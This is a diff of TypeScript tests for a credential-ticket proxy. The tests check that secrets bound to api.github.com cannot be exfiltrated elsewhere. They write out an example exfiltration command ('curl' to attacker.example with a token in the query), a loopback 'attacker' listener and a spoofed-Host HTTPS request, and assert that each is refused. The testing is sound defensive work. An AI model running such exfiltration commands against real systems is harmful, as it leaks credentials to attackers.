@@ -13,6 +13,44 @@ import { CertAuthority } from './ca.js';
 import { CdpSessionStore } from './cdp-session-store.js';
 import { createCoatcheck, type Coatcheck, type CoatcheckDeps } from './server.js';
 import { createMemoryProvider } from './providers/memory.js';
+import { parsePolicy } from './policy.js';
+import { parseHostPattern, type HostPattern } from './host-matcher.js';
+
+const hosts = (...entries: string[]) => entries.map(e => parseHostPattern(e) as HostPattern);
+
+/** Capture console output (to assert on log lines and that values never appear). */
+function captureLogs() {
+  const lines: string[] = [];
+  const spies = (['log', 'warn', 'error'] as const).map(m =>
+    vi.spyOn(console, m).mockImplementation((...args: unknown[]) => { lines.push(args.map(String).join(' ')); }));
+  cleanups.push(() => spies.forEach(sp => sp.mockRestore()));
+  return lines;
+}
+
+/** Plain-HTTP request through the proxy (absolute-form URL). */
+function viaProxy(proxyPort: number, url: string, headers: http.OutgoingHttpHeaders = {}) {
+  return new Promise<{ status: number; headers: http.IncomingHttpHeaders; body: string }>((resolve, reject) => {
+    const req = http.request({ host: '127.0.0.1', port: proxyPort, method: 'GET', path: url, headers }, res => {
+      let body = '';
+      res.on('data', d => { body += d; });
+      res.on('end', () => resolve({ status: res.statusCode ?? 0, headers: res.headers, body }));
+    });
+    req.on('error', reject);
+    req.end();
+  });
+}
+
+/** Plain-HTTP listener on loopback that records what it receives (an agent-run "attacker" or a real upstream). */
+async function startHttpUpstream() {
+  const received: Echo[] = [];
+  const server = http.createServer((req, res) => {
+    received.push({ url: req.url ?? '', headers: req.headers });
+    res.end('ok');
+  });
+  await new Promise<void>(r => server.listen(0, '127.0.0.1', r));
+  cleanups.push(() => new Promise<void>(r => { server.closeAllConnections(); server.close(() => r()); }));
+  return { port: (server.address() as AddressInfo).port, received };
+}
 
 interface Echo { url: string; headers: http.IncomingHttpHeaders }
 
@@ -212,6 +250,115 @@ describe('coatcheck server: CONNECT', () => {
   });
 });
 
+describe('coatcheck server: host-bound tickets', () => {
+  // The THREAT_MODEL exfiltration: mint a ticket for a secret bound to
+  // api.github.com, then send it somewhere else through the proxy.
+  const policy = parsePolicy(JSON.stringify({
+    secrets: { 'github-token': { allowed_hosts: ['api.github.com'] } },
+  }), []);
+  const provider = () => createMemoryProvider({ secrets: { 'github-token': 'ghp_REAL_VALUE' } });
+
+  async function mint(proxyPort: number): Promise<string> {
+    const res = await fetch(`http://127.0.0.1:${proxyPort}/_vault/github-token`);
+    const body = await res.json() as { token: string; allowed_hosts: string[] };
+    expect(body.allowed_hosts).toEqual(['api.github.com']);
+    return body.token;
+  }
+
+  it('blocks the attacker.example exfiltration on the plain-HTTP forward path', async () => {
+    const logs = captureLogs();
+    const { port } = await startProxy({ provider: provider(), policy });
+    const tok = await mint(port);
+
+    // curl -x proxy "http://attacker.example/?k=$TOK": denied before any DNS lookup or dial.
+    const res = await viaProxy(port, `http://attacker.example/?k=${tok}`);
+    expect(res.status).toBe(403);
+    expect(res.headers['x-coatcheck-denied']).toBe('host-mismatch');
+    expect(JSON.parse(res.body)).toMatchObject({ reason: 'host-mismatch', secrets: ['github-token'], host: 'attacker.example' });
+    expect(res.body).not.toContain('ghp_REAL_VALUE');
+    expect(logs).toContainEqual(expect.stringContaining('[swap] scheme=http host=attacker.example result=denied secrets=github-token'));
+    expect(logs.join('\n')).not.toContain('ghp_REAL_VALUE');
+  });
+
+  it('blocks the loopback-listener variant: an agent-run listener never receives the value', async () => {
+    captureLogs();
+    const listener = await startHttpUpstream();
+    // Even listing the loopback address (HTTPS-only entry) does not allow plaintext to it.
+    const loopbackPolicy = parsePolicy(JSON.stringify({
+      secrets: { 'github-token': { allowed_hosts: ['api.github.com', '127.0.0.1'] } },
+    }), []);
+    for (const p of [policy, loopbackPolicy]) {
+      const { port } = await startProxy({ provider: provider(), policy: p });
+      const { token } = await (await fetch(`http://127.0.0.1:${port}/_vault/github-token`)).json() as { token: string };
+      for (const url of [`http://127.0.0.1:${listener.port}/?k=${token}`, `http://localhost:${listener.port}/`]) {
+        const res = await viaProxy(port, url, { authorization: `Bearer ${token}` });
+        expect(res.status, url).toBe(403);
+      }
+    }
+    expect(listener.received).toHaveLength(0);
+  });
+
+  it('blocks the exfiltration over HTTPS: keyed on the CONNECT target, not Host', async () => {
+    const logs = captureLogs();
+    const upstream = await startHttpsUpstream(); // stands in for attacker.example
+    const { port } = await startProxy({ provider: provider(), policy });
+    const tok = await mint(port);
+
+    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
+    const t = await startTls(socket, proxyCa.caCertPem);
+    // A spoofed Host header naming the allowed host does not help.
+    t.write(`GET /?k=${tok} HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: Bearer ${tok}\r\n\r\n`);
+    const [res] = await readResponses(t, 1);
+
+    expect(res.head).toMatch(/^HTTP\/1\.1 403 /);
+    expect(res.head).toMatch(/\r\nX-Coatcheck-Denied: host-mismatch\r\n/i);
+    expect(JSON.parse(res.body)).toMatchObject({ secrets: ['github-token'], host: '127.0.0.1' });
+    await new Promise(r => t.once('close', r)); // the tunnel is closed
+    expect(upstream.received).toHaveLength(0);
+    expect(logs).toContainEqual(expect.stringContaining('[swap] scheme=https host=127.0.0.1 result=denied secrets=github-token'));
+    expect(logs.join('\n')).not.toContain('ghp_REAL_VALUE');
+  });
+
+  it('denies a keep-alive tunnel on the first request carrying a mis-bound ticket', async () => {
+    captureLogs();
+    const upstream = await startHttpsUpstream();
+    const { tokenStore, port } = await startProxy();
+    const good = tokenStore.issue('local', 'real-local', { allowedHosts: hosts('127.0.0.1') }).id;
+    const bad = tokenStore.issue('github-token', 'ghp_REAL_VALUE', { allowedHosts: hosts('api.github.com') }).id;
+
+    const { socket } = await connect(port, `127.0.0.1:${upstream.port}`);
+    const t = await startTls(socket, proxyCa.caCertPem);
+    t.write(`GET /a HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Key: ${good}\r\n\r\n`);
+    const [r1] = await readResponses(t, 1);
+    expect((JSON.parse(r1.body) as Echo).headers['x-key']).toBe('real-local');
+
+    t.write(`GET /b HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Key: ${good}\r\nX-Other: ${bad}\r\n\r\n`);
+    const [r2] = await readResponses(t, 1);
+    expect(r2.head).toMatch(/^HTTP\/1\.1 403 /);
+    expect(upstream.received.map(e => e.url)).toEqual(['/a']);
+  });
+
+  it('swaps bound tickets for their allowed host on both paths', async () => {
+    captureLogs();
+    const https = await startHttpsUpstream();
+    const plain = await startHttpUpstream();
+    const { tokenStore, port } = await startProxy();
+    const tlsTok = tokenStore.issue('k', 'real-https', { allowedHosts: hosts('127.0.0.1') }).id;
+    const httpTok = tokenStore.issue('k', 'real-http', { allowedHosts: hosts('http://127.0.0.1') }).id;
+
+    const { socket } = await connect(port, `127.0.0.1:${https.port}`);
+    const t = await startTls(socket, proxyCa.caCertPem);
+    t.write(`GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Bearer ${tlsTok}\r\n\r\n`);
+    const [res] = await readResponses(t, 1);
+    expect((JSON.parse(res.body) as Echo).headers.authorization).toBe('Bearer real-https');
+
+    expect((await viaProxy(port, `http://127.0.0.1:${plain.port}/p?k=${httpTok}`)).status).toBe(200);
+    expect(plain.received[0].url).toBe('/p?k=real-http');
+    // The HTTPS-only ticket is refused over plaintext.
+    expect((await viaProxy(port, `http://127.0.0.1:${plain.port}/p?k=${tlsTok}`)).status).toBe(403);
+  });
+});
+
 describe('coatcheck server: plain HTTP', () => {
   it('forwards requests and swaps tickets in the URL and headers', async () => {
     const received: Echo[] = [];
@@ -239,6 +386,42 @@ describe('coatcheck server: plain HTTP', () => {
     expect(status).toBe(200);
     expect(received[0].url).toBe('/p?key=real-api-key');
     expect(received[0].headers.authorization).toBe('Bearer real-api-key');
+  });
+
+  it('strips proxy-authorization and hop-by-hop headers', async () => {
+    const upstream = await startHttpUpstream();
+    const { port } = await startProxy();
+    const res = await viaProxy(port, `http://127.0.0.1:${upstream.port}/`, {
+      'proxy-authorization': 'Basic c2VjcmV0',
+      'proxy-connection': 'keep-alive',
+      connection: 'keep-alive, x-hop',
+      'x-hop': 'drop me',
+      te: 'trailers',
+      upgrade: 'h2c',
+      'x-end-to-end': 'keep me',
+    });
+    expect(res.status).toBe(200);
+    const h = upstream.received[0].headers;
+    for (const name of ['proxy-authorization', 'proxy-connection', 'x-hop', 'te', 'upgrade']) {
+      expect(h, name).not.toHaveProperty(name);
+    }
+    expect(h['x-end-to-end']).toBe('keep me');
+  });
+
+  it('swaps only in the path and query, never in the URL authority', async () => {
+    captureLogs();
+    const upstream = await startHttpUpstream();
+    const { tokenStore, port } = await startProxy();
+    const tok = tokenStore.issue('k', 'real-value', { allowedHosts: hosts('http://127.0.0.1') }).id;
+    const res = await viaProxy(port, `http://${tok}@127.0.0.1:${upstream.port}/`);
+    expect(res.status).toBe(200);
+    expect(JSON.stringify(upstream.received)).not.toContain('real-value');
+  });
+
+  it('rejects non-http absolute URLs with 400', async () => {
+    const { port } = await startProxy();
+    expect((await viaProxy(port, 'https://api.example.com/')).status).toBe(400);
+    expect((await viaProxy(port, 'ftp://api.example.com/')).status).toBe(400);
   });
 
   it('serves the vault API on the same listener', async () => {
